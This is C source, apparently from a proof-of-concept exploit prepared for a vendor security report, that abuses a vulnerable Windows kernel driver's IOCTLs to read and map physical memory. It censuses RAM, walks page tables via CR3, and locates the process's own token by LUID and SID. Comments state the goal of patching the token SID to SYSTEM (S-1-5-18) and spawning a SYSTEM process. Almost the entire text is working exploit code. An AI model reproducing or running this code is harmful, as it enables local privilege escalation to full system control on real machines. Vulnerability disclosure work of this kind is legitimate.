        g_prof.cr3 = g_prof.crOK ? (cr & 0x000FFFFFFFFFF000ULL) : 0;
    }
    if (g_prof.cr3) {
        /* probe unconditionally -- the census has not reached the PML4's
         * slot yet (only the anchor + mini sites are marked), so a
         * CensusOK() gate here arms nothing (23:46 field catch) */
        g_prof.pml4Aligned = DevCmdPhysRead(g_prof.cr3, win, 0x100);
        idx = (UINT32)(g_prof.cr3 >> 24);
        if (idx < CENSUS_MAX)          /* seed the slot so the full census
                                        * below does not re-probe it */
            g_census[idx] = g_prof.pml4Aligned ? 1 : 2;
        g_prof.pml4Mis = g_prof.pml4Aligned &&
                         DevCmdPhysRead(g_prof.cr3 + 0x10, back, 8);
        if (g_scanLiftOK) {
            UINT8 page[0x1000];

            g_prof.liftHit = ReadPhysLift(g_prof.cr3, page);
            g_prof.pml4Lift = g_prof.liftHit != 0xFFFFFFFF &&
                              g_prof.liftHit <= 0xe18;
        }
    }
    /* full census: one probe per 16 MB slot below the anchor top -- but
     * only when something mapped (class C skips ~300 refused probes) */
    {
        BOOL anySvc = g_prof.prAligned;

        for (i = 0; i < 6; i++)
            if (g_census[(UINT32)(sites[i] >> 24)] == 1)
                anySvc = TRUE;
        if (anySvc) {
            for (pa = 0; pa < aTop; pa += CENSUS_STEP) {
                idx = (UINT32)(pa >> 24);
                if (g_census[idx])
                    continue;
                g_census[idx] = (idx == 0) ? 2
                    : (DevCmdPhysRead(pa, win, 0x100) ? 1 : 2);
            }
            g_censusN = (UINT32)(aTop >> 24);
        }
    }
    for (i = 0; i < g_censusN; i++) {
        if (g_census[i] == 1)
            g_prof.censOK++;
        else if (g_census[i] == 2)
            g_prof.censDead++;
        if (g_census[i] == 1 && (i == 0 || g_census[i - 1] != 1))
            g_prof.censRuns++;
    }
    /* class */
    {
        BOOL holes = FALSE, anyOK = FALSE;

        for (i = 1; i < g_censusN; i++)
            if (g_census[i] == 1)
                anyOK = TRUE;
            else if (g_census[i] == 2)
                holes = TRUE;
        if (!g_prof.prAligned && !anyOK)
            cls = 3;                       /* C blocked */
        else if (holes)
            cls = 2;                       /* B partial */
        else
            cls = g_prof.prMis ? 0 : 1;    /* A / A' */
    }
    g_prof.cls = cls;
    /* walk route: only when the PML4 page lives in a serving region */
    g_prof.useWalk = g_prof.crOK && (g_prof.pml4Aligned || g_prof.pml4Lift);

    /* capture source: TESTED, not guessed. 00:10 field: the anchor's
     * second page (0x13fff5000) refused maps while its first page served
     * everything -- the static +0x1010 guess burned the whole M1 ladder
     * on GLE=8 in 1.6 s. For each anchor-page candidate: aligned read,
     * paint, real capture at that PA + content check; first complete
     * pass wins, and capOK then means "capture verified at the chosen
     * source". Probe len 0x40 keeps the 0x710 bucket untouched. */
    if (g_prof.prAligned) {
        static const UINT64 cofs[3] = { 0x0ULL, 0x1000ULL, 0x2000ULL };
        UINT32 c;

        for (c = 0; c < 3 && !g_prof.capSrc; c++) {
            UINT64 capPa = g_prof.anchorPa + cofs[c];

            if (!DevCmdPhysRead(capPa, win, 0x40))
                continue;              /* page refuses maps */
            if (!DevCmdPhysWrite(capPa, mp, 0x10))
                continue;              /* write family refused there */
            ZeroMemory(&cp, sizeof(cp));
            if (!DevCmdCapture(capPa, 0x40, &cp) || !cp.userVa ||
                memcmp((const void *)(uintptr_t)cp.userVa, mp, 0x10))
                continue;              /* capture failed or content was
                                        * not our paint */
            g_prof.capSrc = capPa;
            g_prof.capOK = TRUE;
            g_prof.anchorPainted = TRUE;
        }
        if (!g_prof.capSrc)
            LogW(L"[!] preflight: no anchor-page capture source passed "
                 L"paint+capture verification -- the capture family is "
                 L"unusable at the anchor on this boot");
    } else {
        for (i = 1; i < g_censusN && !g_prof.capSrc; i++)
            if (g_census[i] == 1)
                g_prof.capSrc = (UINT64)i * CENSUS_STEP + 0x1010;
        LogW(L"[!] preflight: anchor band refuses maps -- capture source "
             L"moved to census-OK PA 0x%012llx (unpainted: content = live "
             L"RAM, never trusted)",
             (unsigned long long)g_prof.capSrc);
    }
    ProofLog(L"[i] matrix: physread aligned=%u mis=%u  write=%u  scan "
             L"[e2e=%u t=%u]  capture=%u", g_prof.prAligned, g_prof.prMis,
             g_prof.wrOK, g_prof.scanE2E, g_prof.scanT, g_prof.capOK);
    ProofLog(L"[i] PML4 @ 0x%012llx (cr3): aligned=%u mis=%u lift=%u "
             L"(first hit +%03x) -> walk route %ls",
             (unsigned long long)g_prof.cr3, g_prof.pml4Aligned,
             g_prof.pml4Mis, g_prof.pml4Lift, (unsigned)g_prof.liftHit,
             g_prof.useWalk ? L"ARMED" : L"disabled");
    if (g_prof.censRuns > 0 && g_prof.censRuns <= 24 && cls == 2) {
        /* one log line per OK run: the exact region picture */
        for (i = 0; i < g_censusN; i++) {
            UINT32 lo = i;

            if (g_census[i] != 1)
                continue;
            while (i + 1 < g_censusN && g_census[i + 1] == 1)
                i++;
            LogW(L"[i] census run: 0x%012llx..0x%012llx (%lu MiB)",
                 (unsigned long long)lo * CENSUS_STEP,
                 (unsigned long long)((i + 1) * CENSUS_STEP),
                 (unsigned long)((i + 1 - lo) << 4));
        }
    }
    ProofLog(L"[i] PROFILE: %ls -- census %lu OK / %lu dead in %lu runs, "
             L"RAM top 0x%012llx -> route: %ls, capture source 0x%012llx "
             L"(%ls)",
             cn[cls], g_prof.censOK, g_prof.censDead, g_prof.censRuns,
             (unsigned long long)aTop,
             g_prof.useWalk ? L"walk (CR3)"
                            : L"census scan (band-ordered)",
             (unsigned long long)g_prof.capSrc,
             g_prof.anchorPainted ? L"painted" : L"unpainted");
    return cls != 3;
}

/* ==== v5.0.0: the map -> token patch -> SYSTEM chain (P5) ================
 *
 * [prior-art: physmap-class] The escalation DEMO below walks a road other
 * physmap tools have walked for a decade: find our own token body's page
 * in physical memory, map it with 0xFFF028A4 (MmMapIoSpace), patch the
 * inline UserAndGroups SID to S-1-5-18, spawn a CreateProcessWithTokenW
 * child as NT AUTHORITY\SYSTEM. The technique is explicitly labeled
 * prior art; the PSIRT novelty claim rides on the driver-specific bug
 * inventory (the 'ADIO' lifecycle, the argument-forwarding/forged-MDL
 * workers, the 0x2908 capture family), not on this technique.
 *
 * Design notes, all field-audit-derived (docs/worker-audit-218.md):
 *  - identification = our token's OWN LUID (TOKEN.TokenLuid,
 *    NtQueryInformationToken(TokenStatistics) -- unique per token
 *    object), fetched through the one real handle we hold. A qword
 *    match on a random 64-bit LUID at 8-aligned positions has no
 *    credible false-positive population.
 *  - fallback = our own user SID (two alignment variants, see below).
 *  - the pin is only BELIEVED after GetTokenInformation through the
 *    handle reads S-1-5-18 (the M6 rule: window/handle E2E); any
 *    candidate that fails the handle check is reverted page-exact and
 *    dropped, so misidentification costs nothing but a write cycle.
 * ========================================================================= */
#define TK_MAXPAGES 48
#define TK_RAWCAP   256          /* raw hits per span before abort */
#define TKFMAP_MIN  0x1000       /* fast-sweep map floor (4 KB)     */
#define TKFMAP_MAX  0x2000000    /* fast-sweep map cap (32 MB)      */
/* v5.1.3 fast-sweep FLOOR. --pfndb (read-only) measured a 2 MB high-
 * entropy blob at PA 0x1000000..0x1200000 on this guest; touching ANY
 * page there with the 0xFFF028A4 user-map leg bugchecks 0x4E/0x7 on the
 * first mapped page's PFN (runs 6+7, 32 MB and 4 KB -- length-free).
 * The scan worker's kernel-internal maps of the same PA run clean, so
 * it is the user-map leg specifically. Skip all census bands below 64
 * MB: token pool lives high (0x49xxx000 class), cost = 3 of ~310 bands. */
#define TKFMAP_FLOOR 0x4000000ULL
typedef struct _TPAGE {
    UINT64 pagePa;               /* 4 KB-aligned physical page          */
    BYTE   kinds;                /* 1 = own-SID hit, 2 = LUID hit       */
    UINT32 nToke, nSid, nLuid, nBogus;
} TPAGE;

static BYTE   g_ownSid[68];      /* our process user SID, inline form   */
static UINT32 g_ownSidLen;       /* 8 + SubAuthorityCount*4             */
static BYTE   g_bogusSid[68];    /* RID+1 clone: negative self-test     */
static UINT64 g_ownLuid;         /* TOKEN.TokenLuid of OUR token        */
static UINT64 g_ownAuth;         /* AuthenticationId (logon session)    */

/* one adaptive span sweep for an exact 8-byte pattern at stride 8
 * (devcmd scan worker sub_1400029DC: one hit per call, reply dump =
 * 0x40 bytes of the hit region at reply+0x122). A hit is page-
 * registered after pofsRel says where the hit sits inside the object:
 * hitPa - pofsRel = object's first byte (used for full-pattern
 * validation). Everything else (census bands, window backoff, breakers)
 * mirrors S2ScanSpan field behavior. Collects ALL hits (up to
 * TK_RAWCAP); never seeded. Returns FALSE only on breaker/driver
 * failure; "not found" is TRUE with nPages unchanged. */
static BOOL TokScanSpan(const UINT8 *pat8, UINT8 pofsRel, UINT64 lo, UINT64 hi,
                        const wchar_t *tag, TPAGE *list, UINT32 maxPages,
                        UINT32 *nPages, UINT32 *rawHitsOut)
{
    static UINT8 sbuf[SCAN_LEN];
    UINT32 winSize = 0x8000000, deadAdv = 0x1000;
    UINT32 scanCalls = 0, rawHits = 0, consecFloorFail = 0, okStreak = 0;
    UINT64 cur = lo, nextBeat = lo;

    cur = (cur + 0xFFF) & ~0xFFFULL;
    while (cur < hi) {
        UINT64 start = cur, hitPa = 0;
        UINT32 mapLen = winSize, st = 0;
        UINT64 tail = 0x100000000ULL - (start & 0xFFFFFFFFULL);

        if (tail < 0x2000) {
            cur = (start & ~0xFFFFFFFFULL) + 0x100000000ULL;
            continue;
        }
        if ((UINT64)mapLen > tail - 8)
            mapLen = (UINT32)(tail - 8);
        if ((UINT64)mapLen > hi - start)
            mapLen = (UINT32)(hi - start);
        if (cur >= nextBeat) {
            LogW(L"    %ls sweep ... PA 0x%012llx (%lu MiB of 0x%012llx.."
                 L"0x%012llx)", tag, (unsigned long long)cur,
                 (unsigned long)((cur - lo) >> 20),
                 (unsigned long long)lo, (unsigned long long)hi);
            nextBeat += 0x10000000ULL;
        }
        if (!DevCmdScan(start, mapLen, 8, 8, 0x40, pat8, sbuf, &st,
                        &hitPa)) {
            g_xTotalFail++;
            if (++g_xConsecFail >= 256) {
                g_xBreak = TRUE;
                ProofLog(L"[ABORT] %ls hoisted breaker: %u consecutive "
                         L"transport failures (fail=%lu ok=%lu) -- restore "
                         L"S2 and reboot", tag, g_xConsecFail,
                         g_xTotalFail, g_xTotalOK);
                return FALSE;
            }
            if (winSize > 0x1000) {
                winSize /= 2;
                if (winSize < 0x1000)
                    winSize = 0x1000;
                continue;
            }
            if ((mapLen <= 0x1000) && !(start & 0xFFF) &&
                ++consecFloorFail >= 64) {
                g_xBreak = TRUE;
                LogW(L"[x] %ls sweep aborted: %u consecutive page-aligned "
                     L"4 KB windows rejected (GLE=8) -- next census band",
                     tag, consecFloorFail);
                return FALSE;
            }
            if (g_censusN && g_census[(UINT32)(start >> 24)] == 2) {
                cur = (start & ~0xFFFFFFULL) + CENSUS_STEP;
                continue;
            }
            cur += deadAdv;
            if (deadAdv < 0x100000)
                deadAdv <<= 1;
            continue;
        }
        g_xTotalOK++;
        g_xConsecFail = 0;
        consecFloorFail = 0;
        scanCalls++;
        deadAdv = 0x1000;
        if (st != 0) {
            cur += mapLen;        /* window scanned clean */
            okStreak++;
            if (okStreak >= 8 && winSize < 0x8000000) {
                UINT32 grown = winSize * 2;

                winSize = (grown > 0x8000000) ? 0x8000000 : grown;
                okStreak = 0;
            }
            continue;
        }
        rawHits++;
        okStreak = 0;
        if (rawHits >= TK_RAWCAP) {
            LogW(L"[x] %ls: raw-hit cap %u exceeded at 0x%012llx -- the "
                 L"pattern is too common for a census; span aborted", tag,
                 TK_RAWCAP, (unsigned long long)hitPa);
            *rawHitsOut = rawHits;
            return FALSE;
        }
        /* validate the hit. For the LUID probe (pofsRel 0) the driver's
         * exact 8-byte match IS the validation. For the SID variants the
         * hit sits pofsRel bytes into the SID: physread the whole SID at
         * objPa and demand the full own-SID compare (capped hits only
         * pay this call). */
        {
            UINT8  obj[0x40];
            UINT64 objPa = hitPa - pofsRel;
            UINT32 i;
            BOOL   real;

            if (pofsRel == 0) {
                real = TRUE;
            } else {
                if (!DevCmdPhysRead(objPa, obj, g_ownSidLen))
                    return FALSE;
                real = memcmp(obj, g_ownSid, g_ownSidLen) == 0;
            }
            if (!real)
                goto page_tiled;
            {   /* register/dedup the hit's page */
                UINT64 page = objPa & ~0xFFFULL;

                for (i = 0; i < *nPages; i++)
                    if (list[i].pagePa == page)
                        break;
                if (i == *nPages) {
                    if (*nPages >= maxPages) {
                        LogW(L"[i] %ls: page cap %u reached at "
                             L"0x%012llx -- candidate set complete (not "
                             L"a failure; caller proceeds with what it "
                             L"has)", tag, maxPages,
                             (unsigned long long)page);
                        *rawHitsOut = rawHits;
                        return TRUE;
                    }
                    ZeroMemory(&list[i], sizeof(TPAGE));
                    list[i].pagePa = page;
                    (*nPages)++;
                }
                list[i].kinds |= pofsRel ? 1 : 2;
                LogW(L"    %ls hit 0x%012llx (%ls) -> page 0x%012llx "
                     L"registered", tag, (unsigned long long)hitPa,
                     pofsRel ? L"own-SID" : L"TokenLUID",
                     (unsigned long long)page);
            }
        }
page_tiled:
        cur = (hitPa + 8 + 0xFFF) & ~0xFFFULL;   /* page tiling */
    }
    LogW(L"    %ls span 0x%012llx..0x%012llx done (%u scan calls, %u raw "
         L"hits)", tag, (unsigned long long)lo, (unsigned long long)hi,
         scanCalls, rawHits);
    *rawHitsOut = rawHits;
    return TRUE;
}

/* v5.1.0: BULK-MAP fast sweep (LUID probe only). The CMD_SCAN worker
 * caps its window (field: GLE=8 halving to ~15 KB/call => ~6 min for the
 * whole RAM census), but 0xFFF028A4 maps an attacker PA of an ATTACKER
 * LENGTH into user space with no cap in the audited worker. So: map
 * multi-MB windows one at a time, pattern-match IN USER SPACE at memory
 * bandwidth, release each window through the intended-path teardown.
 * ~6 min -> seconds. Same registration contract as TokScanSpan (kind 2
 * pages, TK_MAXPAGES non-fatal cap). Windows that refuse are HALVED
 * until 4 KB (one 4 GB-crossing carve per the scan-era tail rule), dead
 * 4 KB pages advance. Returns FALSE only on a breaker-level failure;
 * an empty result is TRUE with nPages unchanged. */
static BOOL TokFastSweepLuid(const wchar_t *tag, TPAGE *list,
                             UINT32 maxPages, UINT32 *nPages,
                             UINT32 *rawHitsOut)
__attribute__((unused));   /* v5.1.5: retired from live paths -- kept as
                            * the evidence implementation for the report */
static BOOL TokFastSweepLuid(const wchar_t *tag, TPAGE *list,
                             UINT32 maxPages, UINT32 *nPages,
                             UINT32 *rawHitsOut)
{
    static UINT8 sbuf[0x100000];           /* 1 MB user-side staging      */
    UINT32 winLen = TKFMAP_MIN;            /* 4 KB ramp start: double only
                                            * after a fully clean cycle up
                                            * to TKFMAP_MAX (run-6 0x4E)  */
    UINT32 rawHits = 0, mapCalls = 0;
    UINT64 t0 = GetTickCount64();
    UINT32 b;

    if (g_xBreak)
        return FALSE;
    if (*nPages >= maxPages)
        return TRUE;
    for (b = 0; b < g_censusN && !g_xBreak; b++) {
        UINT64 cur, hi;

        if (g_census[b] != 1)
            continue;
        cur = (UINT64)b * CENSUS_STEP;
        while (b + 1 < g_censusN && g_census[b + 1] == 1)
            b++;
        hi = (UINT64)(b + 1) * CENSUS_STEP;
        /* v5.1.4 BUGFIX: the census MERGES contiguous OK bands into one
         * span, so (hi) can sit far above the floor while (cur) still
         * starts at the poison region below it -- run 8 proved it (the
         * floor test passed, the first window still fired at PA
         * 0x1000000 and PFN_LIST_CORRUPTed again). Clamp the START,
         * never just test the end. */
        if (hi <= TKFMAP_FLOOR)
            continue;
        if (cur < TKFMAP_FLOOR)
            cur = TKFMAP_FLOOR;
        LogW(L"    %ls fast band walk 0x%012llx..0x%012llx", tag,
             (unsigned long long)cur, (unsigned long long)hi);
        while (cur < hi && !g_xBreak) {
            UINT64   tail, start = cur;
            UINT32   mapLen = winLen;
            DEVREQ   mp;
            UINT64   off;
            UINT32   stW = 0;

            tail = 0x100000000ULL - (start & 0xFFFFFFFFULL);
            if (tail < 0x1000 + 8) {
                cur = (start & ~0xFFFFFFFFULL) + 0x100000000ULL;
                continue;
            }
            if ((UINT64)mapLen > tail - 8)
                mapLen = (UINT32)(tail - 8);
            if ((UINT64)mapLen > hi - start)
                mapLen = (UINT32)(hi - start);
            if ((UINT64)mapLen < TKFMAP_MIN && hi - start > TKFMAP_MIN)
                mapLen = TKFMAP_MIN;
            ZeroMemory(&mp, sizeof(mp));
            /* v5.1.1 forensics: hard-flush proof line BEFORE the fire --
             * a bugcheck inside the driver names this exact (pa, len). */
            ProofLog(L"[fast] map pa=0x%012llx len=0x%x win=%u",
                     (unsigned long long)start, mapLen, winLen);
            if (!DevCmdMap(start, mapLen, 1, &mp) || mp.status != 0 ||
                !mp.userVa || !mp.block) {
                ProofLog(L"[fast] refuse pa=0x%012llx len=0x%x st=%lu err=%lu",
                         (unsigned long long)start, mapLen,
                         (unsigned long)mp.status, GetLastError());
                if (winLen > TKFMAP_MIN) {
                    winLen >>= 1;
                    LogW(L"[i] %ls: %u MiB map refused at 0x%012llx -> "
                         L"halving (GLE=%lu)", tag, winLen >> 20,
                         (unsigned long long)start,
                         (mp.status != 0) ? (unsigned long)mp.status
                                          : GetLastError());
                    continue;
                }
                if (start & 0xFFF) {
                    cur = (start + 0xFFF) & ~0xFFFULL;
                    continue;
                }
                cur += 0x1000;   /* dead 4 KB page: advance */
                continue;
            }
            if (mapLen < winLen)
                winLen = mapLen; /* remember the serving size */
            mapCalls++;
            /* user-space pattern match: exact 8-byte qword at 8-aligned
             * positions over the whole window (1 MB RPM chunks) */
            for (off = 0; off + 8 <= mapLen; off += 0x100000) {
                UINT64  want = mapLen - off;
                SIZE_T  got = 0, p;

                if (want > sizeof(sbuf))
                    want = sizeof(sbuf);
                want &= ~0x7ULL;
                if (!ReadProcessMemory(GetCurrentProcess(),
                                       (LPCVOID)(ULONG_PTR)(mp.userVa + off),
                                       sbuf, want, &got))
                    break;
                for (p = 0; p + 8 <= got; p += 8) {
                    if (memcmp(sbuf + p, &g_ownLuid, 8))
                        continue;
                    rawHits++;
                    {
                        UINT64 page = (start + off + p) & ~0xFFFULL;
                        UINT32 i;

                        for (i = 0; i < *nPages; i++)
                            if (list[i].pagePa == page)
                                break;
                        if (i == *nPages) {
                            if (*nPages >= maxPages) {
                                LogW(L"[i] %ls: page cap %u reached at "
                                     L"0x%012llx (non-fatal)", tag,
                                     maxPages, (unsigned long long)page);
                                DevCmdUnmap(mp.block, &stW);
                                *rawHitsOut = rawHits;
                                return TRUE;
                            }
                            ZeroMemory(&list[i], sizeof(TPAGE));
                            list[i].pagePa = page;
                            (*nPages)++;
                        }
                        list[i].kinds |= 2;
                        LogW(L"    %ls fast hit 0x%012llx -> page "
                             L"0x%012llx registered",
                             tag,
                             (unsigned long long)(start + off + p),
                             (unsigned long long)page);
                    }
                }
            }
            ProofLog(L"[fast] unmap-ok pa=0x%012llx len=0x%x",
                     (unsigned long long)start, mapLen);
            DevCmdUnmap(mp.block, &stW);
            ProofLog(L"[fast] cycle-done pa=0x%012llx len=0x%x",
                     (unsigned long long)start, mapLen);
            /* v5.1.1 ramp: double only after a fully clean cycle. */
            if (winLen < TKFMAP_MAX)
                winLen <<= 1;
            cur += mapLen;
        }
    }
    LogW(L"    %ls fast sweep done (%u map calls, %u raw hits, %llu.%03llu "
         L"s)", tag, mapCalls, rawHits,
         (unsigned long long)((GetTickCount64() - t0) / 1000),
         (unsigned long)((GetTickCount64() - t0) % 1000));
    *rawHitsOut = rawHits;
    return TRUE;
}

/* census-ordered sweep driver: OK bands first (>= 2 GB bands before low
 * runs, matching CensusSweep's pool-first order); no census -> whole low
 * RAM range the legacy way. The pattern set: pats[0] must be an
 * object-aligned probe (pofsRel 0, e.g. the TokenLUID qword); pats[1/2]
 * the two SID alignment variants (pofsRel 16 = SID+0x10 for 8-aligned
 * SID bases, pofsRel 20 = SID+0x14 for the 4+8k class). */
static BOOL TokSweepAll(const UINT8 (*pats)[8], const UINT8 *pofs,
                        const wchar_t *tag, TPAGE *list, UINT32 maxPages,
                        UINT32 *nPages, UINT32 nPat)
{
    UINT32 i, pass, raw;

    if (g_xBreak)
        return FALSE;
    if (*nPages >= maxPages)
        return TRUE;
    if (!g_censusN || g_census[0] != 2) {
        LogW(L"[i] %ls: no census -- raw low-first sweep 0x100000.."
             L"0x180000000", tag);
        for (i = 0; i < nPat; i++) {
            if (!TokScanSpan(pats[i], pofs[i], 0x100000ULL, 0x180000000ULL,
                             tag, list, maxPages, nPages, &raw))
                return FALSE;
            if (*nPages >= maxPages)
                return TRUE;
        }
        return TRUE;
    }
    for (pass = 0; pass < 2; pass++) {
        for (i = 0; i < g_censusN && !g_xBreak; i++) {
            UINT32 lo, hi, p;

            if (g_census[i] != 1)
                continue;
            lo = i;
            while (i + 1 < g_censusN && g_census[i + 1] == 1 &&
                   g_census[i] == 1)
                i++;
            hi = i;
            if (pass == 0 && (UINT64)lo * CENSUS_STEP < 0x80000000ULL)
                continue;
            if (g_xBreak)
                return FALSE;
            LogW(L"[i] %ls census sweep: OK band 0x%012llx..0x%012llx "
                 L"(%lu MiB)", tag, (unsigned long long)lo * CENSUS_STEP,
                 (unsigned long long)((hi + 1) * CENSUS_STEP),
                 (unsigned long)((hi + 1 - lo) << 4));
            for (p = 0; p < nPat; p++) {
                if (*nPages >= maxPages)
                    return TRUE;
                if (!TokScanSpan(pats[p], pofs[p], (UINT64)lo * CENSUS_STEP,
                                 (UINT64)(hi + 1) * CENSUS_STEP, tag, list,
                                 maxPages, nPages, &raw))
                    return FALSE;
            }
        }
    }
    return TRUE;
}

/* v5.0.0: fetch our own SID and our token's own LUID (TokenStatistics).
 * hSelf must be a real OpenProcessToken handle. */
static BOOL TokWhoAmI(HANDLE hSelf)
{
    static BYTE  ti[0x400];
    ULONG (*pNtQit)(HANDLE, ULONG, void *, ULONG, ULONG *);
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    DWORD   rl = 0;
    SID    *s;
    ULONG   st;

    if (!GetTokenInformation(hSelf, TokenUser, ti, sizeof(ti), &rl)) {
        LogW(L"[x] GetTokenInformation(TokenUser) failed GLE=%lu",
             GetLastError());
        return FALSE;
    }
    s = ((TOKEN_USER *)ti)->User.Sid;
    g_ownSidLen = 8 + (UINT32)s->SubAuthorityCount * 4;
    memcpy(g_ownSid, s, g_ownSidLen);
    memcpy(g_bogusSid, g_ownSid, g_ownSidLen);
    *(UINT32 *)(g_bogusSid + g_ownSidLen - 4) += 1;   /* RID+1 clone */
    LogW(L"[i] own user SID: len=%u rev=%u cnt=%u ia=%02x%02x%02x%02x%02x%02x",
         g_ownSidLen, g_ownSid[0], g_ownSid[1], g_ownSid[2], g_ownSid[3],
         g_ownSid[4], g_ownSid[5], g_ownSid[6]);
    g_bogusSid[0] = (BYTE)'X';   /* poisoned marker: never a real SID */
    if (!hNtdll) {
        LogW(L"[x] ntdll not resolvable -- TokenStatistics unreachable");
        return FALSE;
    }
    pNtQit = (ULONG (NTAPI *)(HANDLE, ULONG, void *, ULONG, ULONG *))
             GetProcAddress(hNtdll, "NtQueryInformationToken");
    if (!pNtQit) {
        LogW(L"[x] NtQueryInformationToken not resolvable");
        return FALSE;
    }
    st = pNtQit(hSelf, 10 /* TokenStatistics */, ti, sizeof(ti), &rl);
    if (st) {
        LogW(L"[x] NtQueryInformationToken(TokenStatistics) -> 0x%08lx",
             (unsigned long)st);
        return FALSE;
    }
    g_ownLuid = *(UINT64 *)(ti + 0) + 0;
    g_ownAuth = *(UINT64 *)(ti + 8);
    LogW(L"[i] token LUID 0x%016llx (pin pattern), AuthenticationId "
         L"0x%016llx (logon session)", (unsigned long long)g_ownLuid,
         (unsigned long long)g_ownAuth);
    if (!g_ownLuid) {
        LogW(L"[x] TokenStatistics.TokenLuid read 0 -- unusable pin");
        return FALSE;
    }
    return TRUE;
}

/* ---- v5.1.7 E2-direct: LOOKUP route (end the per-boot identification
 * lottery). Run 10 measured what the fallback sweep can cost: two full
 * census passes at the kernel's per-position compare rate, and the token
 * body can even MOVE while a long sweep runs. This route replaces the
 * prayer with a lookup, using ONLY legs that have never corrupted a PFN:
 *   1. NtQuerySystemInformation(SystemExtendedHandleInformation) yields
 *      the kernel OBJECT_HEADER address of OUR OWN OpenProcessToken
 *      handle (we are admin; one API call, no leak involved).
 *   2. CR3 via 0xFFF02860 (the proven CR-read leg).
 *   3. KvaToPa() walks our own process's page tables through PHYSREADS
 *      only -- no MDL, no user map, so the runs 6-9 corruption class
 *      (0x4E/0x7 over free-list pages) cannot occur.
 *   4. TokClassifyPage validates the candidate page by content (LUID +
 *      own-SID + 'Toke' counts) before anything else trusts it.
 * The CMD_SCAN sweep (v5.0.2 route) stays the fallback ONLY. ---------- */
static BOOL TokClassifyPage(UINT64 pagePa, TPAGE *pg);
static void TokClassifyWindow(const BYTE *page, TPAGE *pg);
static BOOL TokClassifyMapped(UINT64 pagePa, TPAGE *pg, UINT64 *blockOut);
static BOOL TokenObjVaddr(HANDLE hSelf, UINT64 *objKva)
{
    /* Two measured layouts for the SystemExtendedHandleInformation
     * (class 64) entry area:
     *   A (26100, measured): stride 0x28, Object @+0, UniqueProcessId
     *                @+8, Handle @+0x10, GrantedAccess @+0x14 (extra
     *                pair @+0x18). Alignment histogram 2026-10-17:
     *                every kernel-object qword at buffer offset
     *                == 0x10 mod 0x28, pid-like ints at 0x18, small
     *                handle-ish ints at 0x20.
     *   B (classic docs):  Object @+0, pid @+8, Handle @+0x10 as the
     *                whole record (stride 0x18) -- the 26100 record is
     *                this plus a 16-byte extension, same field order. */
    ULONG (*pNtQsi)(ULONG, void *, ULONG, ULONG *);
    BYTE        *buf = NULL;
    ULONG        size, got = 0, stride, pass;
    LONG         st;
    ULONG        pid = GetCurrentProcessId();
    ULONG        hv  = (ULONG)(ULONG_PTR)hSelf;
    ULONG_PTR    count, i;

    pNtQsi = (ULONG (*)(ULONG, void *, ULONG, ULONG *))
             GetProcAddress(GetModuleHandleW(L"ntdll.dll"),
                            "NtQuerySystemInformation");
    if (!pNtQsi) {
        LogW(L"[x] [direct] NtQuerySystemInformation unavailable");
        return FALSE;
    }
    for (size = 0x400000; size <= 0x40000000 && !buf; size <<= 1) {
        buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, size);
        st = (LONG)pNtQsi(64 /* SystemExtendedHandleInformation */,
                          buf, size, &got);
        if (st >= 0)
            break;
        HeapFree(GetProcessHeap(), 0, buf);
        buf = NULL;
        if ((ULONG)st != 0xC0000004) {   /* STATUS_INFO_LENGTH_MISMATCH */
            LogW(L"[x] [direct] handle-table query st=0x%08lx"
                 L" (size 0x%08lx)", (ULONG)st, size);
            return FALSE;
        }
    }
    if (!buf) {
        LogW(L"[x] [direct] handle-table query kept growing past cap");
        return FALSE;
    }
    count = *(ULONG_PTR *)buf;
    /* entries at +0x10. Final measured layout (alignment histogram,
     * 2026-10-17: ALL kernel-object qwords sit at buffer offset
     * == 0x10 mod 40; pid-like ints at 0x18, handle-like at 0x20):
     *   stride 40 with Object @+0, UniqueProcessId @+8, Handle @+0x10
     *   (as ULONG64), GrantedAccess @+0x14/extra pair @+0x18.
     * The extra 16 bytes per entry are the 26100 extension over the
     * classic 0x18-byte record. Fallbacks: stride 32 and 24, classic
     * offsets -- in case a rebuild of the host changes the record. */
    for (pass = 0; pass < 3; pass++) {
        ULONG pidofs, hdofs, accofs;
        if (pass == 0) {
            stride = 40; pidofs = 8; hdofs = 0x10; accofs = 0x18;
        } else if (pass == 1) {
            stride = 32; pidofs = 8; hdofs = 0x10; accofs = 0x18;
        } else {
            stride = 24; pidofs = 8; hdofs = 0x10; accofs = 0x1c;
        }
        if (count > (ULONG_PTR)((size - 16) / stride))
            count = (ULONG_PTR)((size - 16) / stride);
        for (i = 0; i < count; i++) {
            BYTE *e = buf + 16 + i * stride;

            if (*(UINT64 *)(e + pidofs) == (UINT64)pid &&
                *(UINT64 *)(e + hdofs) == (UINT64)hv &&
                *(ULONG *)(e + accofs) != 0) {
                *objKva = *(UINT64 *)e;
                HeapFree(GetProcessHeap(), 0, buf);
                LogW(L"[+] [direct] token handle 0x%x -> kernel object "
                     L"0x%016llx (entry stride %lu, layout A/extended)",
                     hv, *objKva, stride);
                return TRUE;
            }
        }
    }
    LogW(L"[x] [direct] no handle entry for our token (pid %lu handle "
         L"0x%x) -- count=%llu buf=%lx", pid, hv,
         (unsigned long long)count, (unsigned long)size);
    {   /* diagnostic v4: measure the entry area's alignment from CONTENT.
         * For every qword that looks like a kernel object pointer
         * (0xffff........) or a small pid/handle number, histogram the
         * qword's offset mod 40 -- the dominant bins reveal where
         * Object / pid / Handle columns really sit within the entry
         * stride, and a second histogram of raw offset mod 40 for ALL
         * kernel-object qwords reveals whether the area is one flat
         * table or several sections. */
        ULONG  sz = size - 16;
        BYTE  *p  = buf + 16;
        ULONG  offHist[40] = {0}, valHist[40] = {0};
        unsigned k, b;
        ULONG  nObj = 0;

        LogW(L"[i] [direct] alignment histogram over %llu bytes:",
             (unsigned long long)sz);
        for (k = 0; k + 8 <= sz; k += 4) {
            UINT64 q = *(UINT64 *)(p + k);

            if ((q >> 48) == 0xffffUL) {
                nObj++;
                offHist[(16 + k) % 40]++;
            } else if (q < 0x100000 && q >= 2 && (q & 3) == 0) {
                valHist[(16 + k) % 40]++;
            }
        }
        LogW(L"[i] [direct] kernel-object qwords: %lu", (unsigned long)nObj);
        LogW(L"[i] [direct] object-offset mod 40 hist:");
        for (b = 0; b < 40; b++)
            if (offHist[b] > (nObj / 20))
                LogW(L"      mod=0x%02x  n=%lu", b, (unsigned long)offHist[b]);
        LogW(L"[i] [direct] small-int-offset mod 40 hist:");
        for (b = 0; b < 40; b++)
            if (valHist[b] > 100)
                LogW(L"      mod=0x%02x  n=%lu", b, (unsigned long)valHist[b]);
    }
